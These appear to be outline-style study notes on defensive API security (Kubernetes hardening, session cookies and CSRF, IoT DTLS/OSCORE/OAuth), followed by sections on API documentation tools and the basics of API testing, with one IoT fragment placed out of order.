		○ Expose externally with Service type NodePort (dev) or, preferably, Ingress (prod).

	• Securing service-to-service traffic

		○ Deploy Linkerd, annotate namespace for proxy injection.

		○ Mesh upgrades HTTP to mTLS automatically between pods; rotate certs; identities are service-scoped.

		○ Note: some non-HTTP protocols may need manual TLS (Linkerd advancing here).

	• Limiting lateral movement

		○ Write NetworkPolicies:

			• Ingress: who can talk to me (labels + ports).

			• Egress: where I’m allowed to call (destinations + ports).

		○ Remember: policies are allowlists; combine to form the union of allowed flows.

	• Securing the cluster edge

		○ Ingress controller (NGINX) handles:

			• TLS termination (K8s Secret with cert/key; cert-manager in prod)

			• Routing (Host/path rules), rate limiting, audit logging.

		○ With a mesh, rewrite upstream Host so ingress→backend also rides mTLS.

	• Defending against common attacks

		○ SSRF (server-side request forgery)

			• Best: strict allowlist of URLs/hosts.

			• If allowlist infeasible: block internal/loopback/link-local/multicast/wildcard IPs (v4/v6), and validate every redirect hop (disable auto-follow; cap redirect depth).

			• Prefer zero trust internally—internal services require auth too.

		○ DNS rebinding

			• Validate Host header against an expected set (or proxy config).

			• Use TLS end-to-end so cert CN/SAN must match hostname.

			• Network/DNS layer: block answers that resolve public names to private IPs.

		○ Practical build/deploy notes

			• Build containers with Jib (no Dockerfile) or hand-rolled Dockerfile using distroless.

			• Keep secrets out of images; use Kubernetes Secrets (Chapter 11).

			• Make pods reproducible; keep YAML under version control.

	• Why this matters

		○ Confidentiality \& integrity of inter-service calls (mTLS) + least privilege at container and network layers = strong defense-in-depth.

		○ Clear blast-radius boundaries (privilege separation + policies) make incidents containable.

		○ Ingress centralizes edge security so teams don’t re-solve TLS/rate limiting.

	• Quick checklists

		○ Harden a deployment

			• Distroless/minimal base; multi-stage build

			• runAsNonRoot, allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, drop caps

			• Expose only needed ports

		○ Enable secure comms

			• Annotate namespace for mesh injection

			• Verify mTLS via linkerd tap (or mesh dashboard)

		○ Constrain the network

			• NetworkPolicies for DB (ingress from API only; no egress)

			• Policies for each service pair (ingress/egress)

		○ Protect the edge

			• Ingress TLS with real certs; rate limit + logs

			• If meshed, set upstream Host rewrite for mTLS to backends

		○ Defend link-preview (and similar fetchers)

			• Prefer allowlist; else block private IPs (v4/v6)

			• Validate each redirect; cap to N hops

			• Validate Host header; use TLS; timeouts; small fetch windows





#### Session Cookie Authentication



Main Idea

	• Move from “send username+password on every request” (HTTP Basic) to token-based auth for browser clients—specifically session cookies—and harden them against CSRF and session fixation. Build a tiny same-origin UI to show how browsers, cookies, and headers actually behave.

	• Key concepts (what, why, how)

		○ Why not Basic in browsers

			§ Password sent on every call; costly (password hashing each time) and risky if any endpoint leaks it.

			§ Ugly browser prompts; hard to “log out.”

		○ Token-based auth

			§ Login once → issue short-lived token; present token on subsequent calls until expiry.

			§ Implement via a TokenStore abstraction (create/read/revoke) so backends can change.

		○ Session cookies as the token

			§ Use Spark’s session (JSESSIONID) as the server-side token; store user, expiry, attributes on the session.

			§ Cookie security attributes: Secure, HttpOnly, SameSite (lax/strict), plus Path, Domain, Max-Age/Expires.

			§ Prefer \_\_Host- or \_\_Secure- cookie name prefixes for built-in safeguards.

		○ Same-origin UI \& SOP

			§ Serve HTML/JS from the same origin as the API to avoid CORS issues; use Spark.staticFiles.location("/public").

			§ The browser’s same-origin policy governs what JS can request/read.

		○ Session fixation (must fix on login)

			§ If a preexisting session is reused at login, an attacker can preseed a victim’s session ID.

			§ Mitigation: on successful auth, invalidate any existing session and create a fresh session.

		○ Authenticating requests with the cookie

			§ A request is treated as authenticated if a valid, unexpired session exists; set request.attribute("subject") so downstream filters work.

		○ CSRF: the big risk with cookies

			§ Because browsers auto-attach cookies cross-site, other origins can make state-changing calls “as you.”

			§ Defenses:

				• SameSite cookies (lax/strict) — good baseline for first-party apps.

				• Double-submit token (hash-based) — robust defense:

					• Server returns a CSRF token that is SHA-256(sessionID), Base64url-encoded.

					• Client sends it on each write request as X-CSRF-Token header.

					• Server recomputes SHA-256(sessionID) and compares with constant-time equality; reject if absent/mismatch.

					• Store CSRF token in a non-HttpOnly cookie (or other client storage) so JS can read and echo it.

				• Suppressing Basic auth popups

					• For 401s in a JS app, omit WWW-Authenticate so the browser doesn’t show the default dialog; app redirects to /login.html.

				• Logout

					• Expose DELETE /sessions; read CSRF token from header; invalidate the server session (and thus the cookie). Avoid putting tokens in URLs.

	• Implementation blueprint (in order)

		○ Serve UI from same origin; simple fetch-based forms.

		○ Add /sessions POST (login): Basic-auth -> create fresh session -> return CSRF token (hash of session ID).

		○ Add CookieTokenStore; on create: invalidate old session; set attributes; return hashed token.

		○ Add validateToken filter: read X-CSRF-Token; if present and not expired, set subject.

		○ Mark sensitive routes to require auth; client JS includes X-CSRF-Token on writes.

		○ Add DELETE /sessions for logout (verify CSRF; invalidate session).

	• Gotchas \& good defaults

		○ Always HTTPS; mark auth cookies Secure; HttpOnly; SameSite=strict (or lax if UX needs link navigation).

		○ Never change server state on GET.

		○ Use constant-time comparison for secrets (e.g., MessageDigest.isEqual).

		○ Avoid Domain on cookies unless necessary; prefer host-only (\_\_Host-…) to resist subdomain issues.

		○ Do not rely solely on “JSON Content-Type” or “custom headers” tricks for CSRF—use real CSRF tokens.

	• When session cookies are a good fit

		○ First-party, same-origin browser apps.

		○ You want automatic cookie handling + browser protections (Secure/HttpOnly/SameSite).

#### What is API Security?



Main Idea

	• APIs are ubiquitous and therefore high-value targets. “API security” = define what must be protected (assets), decide what “secure” means for your context (security goals), understand who/what can threaten those goals (threat model), and apply the right mechanisms (encryption, authN/Z, logging, rate-limits). It’s iterative—not a one-and-done checkbox.

	• What is an API (and Styles)

		○ API = boundary + contract between components; optimized for software consumption (vs a UI for humans).

		○ Styles \& trade-offs

			• RPC/gRPC/SOAP: efficient, tight coupling via stubs.

			• REST(ful): uniform interface, looser coupling, evolvability.

			• GraphQL/SQL-like: few ops, rich query language.

			• Microservices: many internal APIs; security spans service-to-service too.

	• API security in context

		○ Security sits at the intersection of:

			• InfoSec (protect data lifecycle; crypto, access control),

			• NetSec (TLS/HTTPS, firewalls, network posture),

			• AppSec (secure coding, common vulns, secrets handling).

	• Typical deployment stack (where controls live)

		○ Firewall → Load balancer → Reverse proxy/API gateway → App servers

		○ Extras: WAF, IDS/IPS. Gateways often do TLS termination, auth, and rate-limits, but bad app design can still undermine them.

	• Elements to define before building

		○ Assets: data (PII, credentials), systems, logs, even session cookies/keys.

		○ Security goals (NFRs): CIA triad—Confidentiality, Integrity, Availability—plus accountability, privacy, non-repudiation.

		○ Environment \& threat model: which attackers matter here? Use dataflow diagrams and trust boundaries to reason about risk.

		○ Threat categories: STRIDE = Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege.

	• Core mechanisms you’ll apply

		○ Encryption

			• In transit: TLS/HTTPS; hides and integrity-protects traffic.

					® At rest: database/filesystem encryption (context-dependent).

		○ Identification \& Authentication

					® Why: accountability, authorization decisions, DoS mitigation.

			• Factors: something you know (password), have (security key/app), are (biometrics). Prefer MFA/2FA.

		○ Authorization / Access control

					® Identity-based: who you are → what you can do (roles/policies).

					® Capability-based: what this unforgeable token lets you do (fine-grained, delegable).

				□ Audit logging

					® Record who/what/when/where/outcome; protect logs from tampering; mind PII.

				□ Rate-limiting \& quotas

				□ Preserve availability and absorb spikes/DoS; throttle or reject before resources are exhausted; often implemented at the gateway/LB.

	• Design \& testing mindset

		○ Don’t judge ops in isolation; compositions can be insecure (e.g., deposit + withdrawal vs a single atomic transfer).

		○ Turn abstract goals into testable constraints; iterate as new assets/assumptions emerge.

		○ There’s no absolute security; make context-appropriate trade-offs (e.g., GDPR/PII obligations, breach reporting).

	• Analogy mapping (driving test story → API concepts)

		○ Recognizing Alice vs showing a license → identification vs authentication levels.

		○ Train ticket / club celebrity / house keys → authorization models and delegation scope.

		○ CCTV footage → audit logs (accountability, non-repudiation).

	• Quick checklist to apply

		○ List assets (incl. credentials, tokens, logs).

		○ Decide goals (CIA + accountability/privacy).

		○ Draw a dataflow diagram; mark trust boundaries.

		○ Enumerate threats with STRIDE.

		○ Enforce TLS everywhere; plan for at-rest encryption as needed.

		○ Choose auth (with MFA) and authz (roles/capabilities).

		○ Implement audit logging (tamper-resistant).

		○ Add rate-limits/quotas and input size/time guards.

		○ Validate end-to-end flows (not just endpoints).

		○ Revisit the model regularly; update tests and controls.

#### Securing IoT Communications



Main Idea

	• Securing IoT communication needs different choices than classic web APIs because devices are constrained, often use UDP, hop across heterogeneous networks, and face physical/nonce/entropy pitfalls. Use DTLS (or emerging QUIC) thoughtfully, prefer cipher suites and message formats that fit constrained hardware, add end-to-end protection above transport, and manage keys for scale and forward secrecy.

	• Why TLS “as usual” doesn’t fit IoT

		○ Constrained nodes: tiny CPU/RAM/flash/battery.

		○ UDP \& small packets: CoAP/UDP, multicast, sleep cycles.

		○ Protocol gateways: BLE/Zigbee → MQTT/HTTP breaks pure end-to-end TLS.

		○ Physical/side-channel risks and weak randomness sources.

	• Transport-layer security (DTLS/QUIC)

		○ DTLS = TLS for UDP. Same guarantees, but packets can reorder/replay; needs app-level handling.

		○ Java note: DTLS via low-level SSLEngine (handshake states: NEED\_WRAP/UNWRAP/TASK); higher-level libs (e.g., CoAP stacks) hide this.

		○ QUIC/HTTP-3: UDP with built-in TLS 1.3; promising for low-latency IoT but not yet ubiquitous.

	• Cipher suites for constrained devices

		○ Avoid AES-GCM with DTLS on constrained gear (easy to misuse nonces; catastrophic if reused).

		○ Prefer:

			§ ChaCha20-Poly1305 (fast, small, software-friendly).

			§ AES-CCM (good with AES hardware; choose 128-bit tag; avoid \_CCM\_8 unless bytes are critical + strong compensations).

		○ Favor forward secrecy (ECDHE) when you can; TLS 1.3 removes weak key exchanges.

		○ Consider raw public keys (DTLS RFC 7250) to ditch X.509 parsing on devices.

	• Pre-Shared Keys (PSK)

		○ Why: remove cert/signature code; huge footprint savings.

		○ Rules: PSKs must be strong random keys (≥128-bit); never passwords (offline guessing).

		○ Flavors:

			§ Raw PSK (no FS) → simplest, but past sessions fall if key leaks.

			§ PSK + (EC)DHE → adds forward secrecy with moderate cost.

		○ Server must map PSK identity → device identity.

	• End-to-end (E2E) security above transport

		○ Transport (TLS/DTLS) protects each hop; gateways still see plaintext. Add message-level AEAD:

			§ COSE over CBOR for IoT (JOSE/JSON analogs).

			§ Use HKDF to derive per-message keys and bind context (sender/receiver IDs, message type, direction) to stop replay/reflection.

			§ Pragmatic alternative: NaCl/libsodium (SecretBox/CryptoBox) for fixed, safe primitives with simple APIs.

		○ Nonces \& misuse resistance

			§ Constrained devices often have poor randomness → nonce reuse risk.

			§ Safer AE modes:

				□ SIV-AES (MRAE): tolerates repeated nonces without total failure (still aim for unique nonces; include random IV as associated data). Needs only AES-ENC (good for HW).

	• Key distribution \& lifecycle

		○ Provisioning: per-device keys at manufacture (in ROM/secure element) or derive from master via HKDF using device IDs.

		○ Key distribution servers: enroll device, rotate keys periodically; can piggyback on OAuth2/JWT/CBOR tokens.

		○ Ratcheting: symmetric key evolution (e.g., HKDF or AES-CTR with reserved IV) for forward secrecy over time.

		○ Post-compromise security: best with hardware (TPM/TEE/secure element) or occasional ephemeral DH mixes; hard to guarantee if attacker stays in the loop.

	• Threats \& hardening notes

		○ Side-channel/fault attacks: prefer constant-time primitives (ChaCha20), secure elements, certifications (FIPS/CC).

		○ Replay/rate-limit: timestamps/counters, strict API rate limits (esp. with short MAC tags).

		○ Identity binding: include sender/receiver identities and context in AEAD associated data.

	• Key terms

		○ DTLS: TLS for UDP.

		○ Constrained device: tight CPU/RAM/energy/connectivity.

		○ PSK: pre-shared symmetric key; mutual auth.

		○ COSE/CBOR: JOSE/JSON’s compact binary siblings.

		○ MRAE / SIV-AES: misuse-resistant AE; resilient to nonce reuse.

		○ Ratcheting: one-way key updates for forward secrecy.

	• Practical checklist

		○ If you use UDP, use DTLS (or QUIC where it fits).

		○ Pick ChaCha20-Poly1305 (default) or AES-CCM (with AES HW).

		○ Avoid AES-GCM on DTLS unless you are 100% sure about nonces.

		○ Use raw public keys or PSK to cut code size; add (EC)DHE if you can for FS.

		○ Add message-level E2E AEAD (COSE or NaCl) across gateways.

		○ HKDF per-message keys + context binding; include anti-replay (counters/timestamps).

		○ Rotate keys via ratchets; plan secure provisioning and distribution.

		○ Consider secure elements/TEE for tamper resistance and post-compromise recovery.





#### Securing IoT APIs



Main Ideas

	• IoT APIs must authenticate devices (not just users), prove freshness to stop replays, fit OAuth2 to constrained UX/hardware, and continue making local auth decisions when offline. Use transport-layer auth when you can; otherwise add end-to-end request auth with replay defenses. For consumer IoT, use the OAuth device grant; for deeply constrained stacks, use ACE-OAuth with PoP tokens.

	• Device identity \& transport-layer auth

		○ Device profiles: store device\_id, make/model, and an encrypted PSK (or public key). Create during manufacturing/onboarding.

		○ Device “certificates” without PKI: signed JWT/CWT holding device attributes + encrypted PSK the API can decrypt.

		○ TLS/DTLS PSK auth: client sends PSK identity in handshake; server looks up device profile → decrypts PSK → mutual auth.

			§ Only trust the PSK ID after the handshake (it’s authenticated then).

			§ Expose device identity to the app layer to drive authorization.

	• End-to-end authentication (beyond transport)

		○ Gateways break pure end-to-end TLS; add message-level auth (COSE/NaCl) so only API can open/verify the request.

		○ Entity authentication = message authentication + freshness.

			§ Freshness options:

				□ Timestamps (weakest; allow windowed replays).

				□ Unique nonces / counters (server stores seen nonces / highest counter).

				□ Challenge–response (server sends nonce; strongest, extra round trip).

		○ Beware delay/reorder attacks (not just replay).

	• OSCORE in one glance (end-to-end for CoAP)

		○ Uses PSK + COSE to protect CoAP end-to-end.

		○ Maintains a security context:

			§ Common: Master Secret (+ optional Salt), algorithms, Common IV (all via HKDF).

			§ Sender: Sender ID, Sender Key, sequence number (Partial IV).

			§ Recipient: Recipient ID/Key, replay window.

		○ Nonces = function(Common IV, Sender ID, sequence#). Deterministic → store state reliably to avoid nonce reuse.

		○ Messages are COSE\_Encrypt0; Sender ID + Partial IV go in (unprotected) headers but are authenticated via external AAD.

		○ Recipient tracks replay (window) or rely on sticky routing/synchronized state across servers.

	• Replay-safe REST patterns

		○ Idempotency helps but isn’t sufficient by itself.

### API Documentation

#### API Foundations



What is an API?

	• An API (Application Programming Interface) is a middle layer that enables communication and interaction between two applications, systems, or programs. It allows developers to reuse existing functionality and data instead of building everything from scratch.

	• Key Concepts

		○ Definition of API

			§ Stands for Application Program Interface.

			§ Serves as an interface between two programs or systems.

			§ Can be software that connects applications.

		○ Purpose of APIs

			§ Organizations expose data or functionality publicly via endpoints.

			§ Developers can pull and integrate that data into their own applications.

			§ Promotes reuse of existing capabilities instead of duplicating effort.

		○ How APIs Work

			§ Example flow:

				□ Database ↔ Web Server ↔ API ↔ Web Application ↔ User (Internet)

			§ APIs handle requests from one application and deliver a response after interacting with servers and databases.

		○ Examples

			§ Stock prices: An app can fetch real-time stock data from another application’s API.

			§ Weather apps: When checking the weather, the app sends a request to a web server through an API, which fetches data from a database and returns it.

		○ Request–Response Model

			§ Request: Sent by the client application (e.g., stock app asking for prices).

			§ Response: Returned by the API after fetching/processing the requested data.

		○ Modern Relevance

			§ APIs are essential in today’s world for interoperability, integration, and efficiency.

			§ Many organizations rely on APIs provided by others instead of reinventing similar functionality.



Types of APIs

	• APIs, specifically web APIs (using HTTP), can be classified into four main types—Open, Partner, Internal, and Composite—based on access levels and scope of use. Each type serves a distinct purpose and has different implications for security, accessibility, and performance.

	• Key Concepts

		○ Open (Public) APIs

			§ Also called External APIs.

			§ Available for anyone to use (with little or no authentication).

			§ Can be free or subscription-based (depending on usage volume).

			§ Business advantage: Wider reach, more developers use their services, increased value of their APIs.

			§ Developer advantage: Easy access to data with minimal restrictions.

		○ Partner APIs

			§ Restricted to specific partners/business collaborators.

			§ Requires stronger authentication (e.g., license keys, secure tokens).

			§ Business advantage: More control over how data is shared/used and with whom.

			§ Used to strengthen business collaborations.

		○ Internal (Private) APIs

			§ Not for public use—restricted to internal systems within an organization.

			§ Enable communication between internal systems and applications.

			§ Useful when new systems are integrated with existing infrastructure.

			§ Advantage: Keeps internal workflows and data secure and organized.

		○ Composite APIs

			§ Bundle multiple API requests into one, returning a single response.

			§ Useful when data needs to be fetched from multiple servers or sources.

			§ Advantages:

				□ Reduces number of calls (less server load).

				□ Improves speed and performance.

#### API Documentation



What is API Documentation?

	• API documentation is like a user manual for an API. Even the best API is ineffective without proper documentation. Good documentation ensures developers understand, integrate, and use the API efficiently, ultimately leading to higher consumer satisfaction.

	• Key Concepts

		○ Purpose of API Documentation

			§ Explains the complete functionality of the API.

			§ Serves as a guide/manual for developers.

			§ Provides consumer satisfaction by making the API easy to use.

		○ What It Should Include

			§ Purpose of the API: What it is designed to do.

			§ Inputs/parameters: What needs to be passed for proper usage.

			§ Integration details: How to connect and use the API effectively.

			§ Best practices: The most efficient way to use the API.

			§ Examples and tutorials: Practical demonstrations that improve understanding.

		○ Benefits of Good Documentation

			§ Helps developers quickly and effectively use the API.

			§ Enhances analytical skills of developers by providing real-world examples.

			§ Improves integration speed and reduces errors.

			§ Leads to better adoption of the API.

		○ Ways to Create Documentation

			§ Written manually (detailed custom documentation).

			§ Generated using automation tools (to speed up creation and maintenance).

		○ Importance in API Lifecycle

			§ Documentation is a crucial phase in the API development lifecycle.

			§ Without it, even a powerful API may go unused.



Importance of API Documentation

	• Good API documentation is essential for adoption, usability, and long-term success of APIs. It acts like an instruction manual, saving time, reducing costs, improving developer experience, and increasing the popularity of APIs.

	• Key Concepts

		○ Ease of Use for Developers

			§ Developers prefer APIs with clear instructions so they can quickly integrate them.

			§ Good documentation makes APIs easy to plug into applications without guesswork.

			§ Reduces frustration and increases consumer satisfaction.

		○ Technology Independence

			§ Documentation should be understandable by anyone, even without a deep technical background.

			§ Makes APIs accessible to a wider audience.

		○ Faster Onboarding

			§ New developers can get started quickly by following documentation.

			§ Saves time during training and ramp-up phases.

		○ Time and Cost Savings

			§ Clear documentation reduces the need for direct support from API providers.

			§ Consumers can self-serve answers to questions.

			§ Saves money for both providers and consumers.

		○ Easy Maintainability

			§ Good documentation includes details like requests, responses, and integrations.

			§ This makes maintenance, debugging, and updates much easier.

		○ Popularity and Adoption

			§ Well-documented APIs are more likely to gain widespread adoption.

			§ High consumer satisfaction leads to word-of-mouth popularity.

			§ Many of the most popular public APIs succeed because of excellent documentation.



#### Components of API Documentation



Name, Description, and Endpoints

	• Clear and well-structured API documentation components—such as name, description, and endpoints—are critical for helping developers understand and use an API effectively. These elements provide context, usability, and technical entry points.

	• Key Concepts

		○ Name

			§ Should be meaningful and self-explanatory.

			§ Provides a gist of the API’s purpose even without reading the description.

			§ Example: An API named Product immediately signals it deals with product-related data.

		○ Description

			§ Explains how the API can be used in real-world scenarios.

			§ Focuses on business use cases, not just technical details.

			§ Example: For a sports store API, the description might say it provides details of all products in the store.

			§ Can include subsections for specific functionality, like Product by ID or Product by Name, each with its own description.

		○ Endpoints

			§ One of the most important parts of API documentation.

			§ Endpoints are essentially URLs that define where and how the API communicates with systems.

			§ Each touchpoint in communication is considered an endpoint.

			§ Documentation usually provides:

				□ Base URL at the top (common to all calls).

				□ Specific endpoints for different actions (only the changing parts are listed separately).



Authorization, Parameters, and Headers

	• API documentation must clearly include authorization/authentication methods, parameters, and headers, as these are critical for controlling access, structuring API calls, and providing additional context in communication between clients and servers.

	• Key Concepts

		○ Authorization \& Authentication

			§ Authentication: Identifies who can access the API.

			§ Authorization: Determines what actions the authenticated user can perform.

			§ Analogy: Authentication = showing ID, Authorization = what access rights that ID grants.

			§ Common types of API authentication:

				□ None: No authentication (e.g., for internal APIs).

				□ Basic Auth: Username \& password sent with each API call.

				□ API Key Auth: Long, unique tokens sent with each call.

				□ OAuth: Auto-approves and securely manages developer access.

			§ Documentation requirement: Must specify the type of authorization, what’s needed (username, password, token, etc.), and how to provide it.

		○ Parameters

			§ Represent the variable part of a resource in an API call.

			§ Consist of name + value pairs.

			§ Can be required (must be provided for the API to work) or optional (used for filtering, refining results, etc.).

			§ Documentation requirement:

				□ List all parameters.

				□ Describe their purpose and usage.

				□ Clearly mark whether each is required or optional.

		○ Headers

			§ Similar to parameters, using key–value pairs.

			§ Carry metadata about the request (e.g., content type, authorization tokens, caching directives).

			§ Sent along with requests to help servers interpret or validate the call.

			§ Documentation requirement: Must include all headers used, their purpose, and example values.



Request and Response

	• API documentation must clearly explain the request and response structure, including attributes, examples, and error/success codes. Well-written, simple, and interactive documentation improves usability and developer experience.

	• Key Concepts

		○ Request Body

			§ Contains attributes with assigned values that are required to make an API call.

			§ Each attribute should have a short description explaining its purpose.

			§ Documentation should clearly list all attributes that make up the request body.

		○ Response Body

			§ Shows the output returned after sending a request.

			§ Documentation should include example responses so consumers know what to expect.

		○ Success and Error Codes

			§ Must list possible status codes (e.g., 200 OK, 400 Bad Request, 401 Unauthorized, 500 Server Error).

			§ Each code should have a short explanation of its meaning.

			§ Helps developers troubleshoot and handle errors properly.

		○ Best Practices for Documentation

			§ Keep language simple and easy to understand.

			§ Organize content well; avoid unnecessary technical jargon.

			§ Prefer auto-generated documentation to stay up to date with the latest API changes.

			§ Provide interactive features (e.g., “Try it out” options) to let developers test API calls directly.



#### Integrating Documentation with API Tools



Swagger

	• Swagger is one of the most popular tools for creating API documentation. Its strength lies in auto-generating documentation from code, keeping it up to date, and making it interactive so developers can try out APIs directly.

	• Key Concepts

		○ Autogenerated Documentation

			§ Swagger can generate documentation directly from code.

			§ Ensures the documentation is always current with the latest changes.

			§ Saves time and effort compared to writing docs manually.

		○ User-Friendly Interface

			§ Swagger UI (example: petstore.swagger.io) is clean and well-organized.

			§ Uses color coding for HTTP methods:

				□ GET → Blue

				□ POST → Green

				□ PUT → Yellow

				□ DELETE → Red

			§ Endpoints are expandable/collapsible, making navigation easier.

		○ Comprehensive Endpoint Details

			§ Expanding an endpoint shows:

				□ Parameters

				□ Request body

				□ Example values

				□ Success \& error codes

			§ All previously discussed API documentation components (name, description, parameters, headers, request/response, etc.) are included.

		○ Interactivity ("Try it out")

			§ Developers can execute API calls directly in the documentation.

			§ Example: Adding a new pet → sending request with attributes (ID, category, name, etc.) → getting a live response (200 success).

			§ Ability to test endpoints like "Find pet by ID" demonstrates real-time functionality.

		○ Consumer Benefits

			§ Makes documentation hands-on and engaging.

			§ Helps developers quickly see how an API works and decide if it fits their use case.

			§ Reduces onboarding time and increases consumer satisfaction.



Postman

	• Postman is widely known as an API testing tool, but it also has strong built-in features for generating API documentation. It allows documentation at both the individual request level and the collection level, making it easy to provide comprehensive API reference material.

	• Key Concepts

		○ Documentation for Individual Requests

			§ Each API request in Postman (e.g., a GET request) can have its own attached documentation.

			§ Accessed via a paper icon on the right side of the request.

			§ Displays complete details of the request: method, parameters, headers, etc.

		○ Documentation for Entire Collections

			§ Postman supports documenting not just single requests but the whole collection of related API calls.

			§ Users can generate and view full API documentation with a single link.

			§ The collection-level docs show:

				□ Endpoints

				□ Descriptions

				□ Parameters \& headers

				□ Authorization details

				□ Request \& response body

				□ Success and error codes

		○ Code Snippets

			§ Postman offers the ability to add code snippets in different programming languages.

			§ This feature helps developers see how to call the API directly in their preferred language.

		○ Strengths of Postman Documentation

			§ Combines API testing + documentation in one tool.

			§ Documentation is integrated and updated alongside API requests.

			§ Provides a clear, structured view for developers to understand how APIs work.



Confluence

	• Confluence is a strong tool for documenting internal APIs, especially those shared across teams. It allows manual organization of API documentation into structured pages (objects, endpoints, attributes, etc.), but it can also leverage OpenAPI specs for automated, interactive documentation.

	• Key Concepts

		○ Use Case

			§ Best suited for internal API documentation shared within teams.

			§ Helps organize API knowledge in a collaborative workspace.

		○ Structure in Confluence

			§ Pages per object: Each API object (e.g., Product) gets its own page.

			§ Endpoints: Listed under the object with links to details.

				□ Examples: Get all products, Add new product, Fetch product by ID.

			§ Attributes: Documented with details such as:

				□ Data type

				□ Required/optional

				□ Short description

			§ Endpoint Documentation

				□ Each endpoint (e.g., POST for creating a product) includes:

					® Short description of functionality

					® Endpoint URL

					® Parameters and headers (with required/optional tags)

					® Success and error codes, with explanations and possible solutions

					® Example request and response bodies

					® Code snippets in multiple programming languages

		○ Manual vs. Automated Documentation

			§ Typically documentation is manually created in Confluence.

			§ But if an OpenAPI spec (JSON/YAML) is available, Confluence can support auto-generated interactive documentation.

		○ Other Tools

			§ Besides Confluence, other API documentation tools include:

				□ Redocly

				□ Stoplight

				□ ReadMe

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 		○ Use precondition headers with ETags:

			§ Update: If-Matches (reject with 412 if the stored ETag changed).

			§ Create: If-None-Match: \* to prevent overwriting newer versions.

		○ Last-Modified / If-Unmodified-Since also work (coarser granularity).

		○ For end-to-end paths, embed headers + method + body into an encrypted request object (e.g., CBOR + CryptoBox). On receipt:

			§ Decrypt \& verify.

			§ Enforce that actual HTTP method/headers match the request object (don’t let objects override transport metadata).

	• OAuth2 adapted to IoT

		○ Device Authorization Grant (device flow):

			§ Device starts flow → gets device\_code, short user\_code, verification\_uri.

			§ Shows user\_code/QR to user; user approves on phone/PC.

			§ Device polls token endpoint; handles authorization\_pending, slow\_down, access\_denied, expired\_token.

		○ ACE-OAuth (OAuth for constrained envs):

			§ CoAP + CBOR + COSE; PoP tokens by default (bound to symmetric or public keys).

			§ Tokens in CWT; APIs get key via introspection or from the token; can combine with OSCORE for protecting API traffic.

		○ Offline authentication \& authorization

			§ Offline user auth: provision short-lived credentials the device can verify locally (e.g., one-time codes/QR with stored hash, or signed tokens bound to a key/cert presented over BLE).

			§ Offline authorization:

				□ Periodically sync policies (XACML or lighter custom format).

				□ Use self-contained tokens with scopes or macaroons (add caveats like expiry, geo-fence, time-box; verify locally). Third-party caveats fit IoT well.

		○ Key terms

			§ Device onboarding: registering device + credentials.

			§ Entity authentication: who sent it and that it’s fresh.

			§ OSCORE: COSE-protected CoAP with HKDF-derived context and replay windows.

			§ Request object: method+headers+body packaged and encrypted as one unit.

			§ Device grant: OAuth flow with user\_code on a second screen/device.

			§ ACE-OAuth: OAuth over CoAP/CBOR with PoP tokens.

			§ Macaroons: bearer tokens with verifiable, append-only caveats.

		○ Practical checklist (opinionated)

			§ If device ↔ API is direct, use TLS/DTLS PSK (or client certs); map PSK ID → device profile → authZ.

			§ Crossing gateways? Add COSE/NaCl end-to-end request protection + freshness (prefer challenge–response or counters).

			§ For CoAP ecosystems, adopt OSCORE; plan for state persistence and replay windows.

			§ For REST mutations, require ETag preconditions; include ETag/method inside request objects and enforce match.

			§ Consumer UX: use OAuth device grant. Constrained stacks: plan ACE-OAuth + PoP.

			§ Offline operation: cache policies/tokens; use macaroons or short-lived PoP tokens; limit offline privileges/time.





--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### API Testing

#### Understanding Web Services and APIs



Introduction to Web Services

	• APIs dominate modern internet traffic (roughly 60–80%), and they connect innumerable web services. Testers need to understand and probe these services effectively.

	• Key Concepts

		○ Definitions

			§ Web service (working definition): A function you can access over the web.

				□ Think function → input → processing → output.

			§ API: The interface to send inputs to a service and receive outputs.

			§ Black-box perspective: Treat the service internals as unknown; evaluate behavior purely via inputs/outputs.

			§ Service scope varies:

				□ Tiny, single-purpose endpoints (e.g., a math evaluator like MathJS).

				□ Full applications with many interrelated features.

				□ Internal (owned by your org) vs external (third-party) services.

		○ Testing implications

			§ Use black-box testing techniques: design input cases, observe outputs, infer behavior/bugs without relying on implementation details.

			§ Adjust approach based on service scope (small utility vs complex app) and ownership (internal vs external).

			§ Focus on request/response contracts: inputs, validation, error handling, and output correctness.



Types of APIs

	• different types of APIs—REST, SOAP, and GraphQL—explaining their principles, differences, and practical use cases. It highlights how APIs define the structure of requests and responses, and how developers/testers interact with them.

	• Key Concepts

		○ REST APIs (Representational State Transfer)

			§ Originated from Roy Fielding’s doctoral thesis.

			§ Principles: Simple, consistent, and resource-based design.

			§ Characteristics:

				□ Most common style in modern APIs.

				□ Uses HTTP methods (GET, POST, PUT, DELETE).

				□ Typically returns JSON.

			§ Takeaway: If you’re unsure what type of API you’re working with, REST is the most likely.

		○ SOAP APIs (Simple Object Access Protocol)

			§ Older but still used in many systems.

			§ Highly standardized with rules defined by WSDL (Web Services Description Language).

			§ Uses XML for both requests and responses.

			§ Requires strict request formatting (headers, content types, and body structure).

			§ Requests usually sent with POST.

			§ Takeaway: SOAP enforces consistency but is more rigid and verbose compared to REST.

		○ GraphQL

			§ Created by Facebook (Meta) in 2015, growing in popularity.

			§ Query Language for APIs → gives clients fine-grained control over the data requested.

			§ Features:

				□ Single endpoint (unlike REST which often has many).

				□ Clients specify exactly what data they need → reduces over-fetching/under-fetching.

				□ Example: Request only country name and capital, excluding currency if not needed.

			§ Takeaway: GraphQL is flexible and efficient, letting clients shape the response to their exact needs.

		○ Practical Testing/Usage Notes

			§ REST → easy, common, loosely standardized.

			§ SOAP → structured, XML-based, requires strict adherence to WSDL.

			§ GraphQL → highly flexible, query-driven, single endpoint, selective data retrieval.

		○ Overall Takeaway

			§ There are multiple API paradigms, each with trade-offs:

				□ REST = simplicity and ubiquity.

				□ SOAP = rigid structure and enterprise legacy systems.

				□ GraphQL = flexibility and precision for modern data-driven apps.

#### Getting Started with API Testing



Risk of using Services and APIs

	• API testing is fundamentally about risk reduction. APIs introduce unique risks—such as version changes, availability issues, timing problems, performance bottlenecks, and security vulnerabilities—that testers must anticipate and mitigate.

	• Key Concepts

		○ API Changes

			§ Public APIs: Generally stable, but version upgrades can break existing integrations.

			§ Private APIs: May change frequently without strict versioning (e.g., endpoint names, request/response data), requiring constant test updates.

			§ Any change can introduce bugs even if the interface looks the same.

		○ Availability Risks

			§ Network issues: Flaky internet can impact API reliability.

			§ Permissions: Must enforce correct access control. Testing should check both sides:

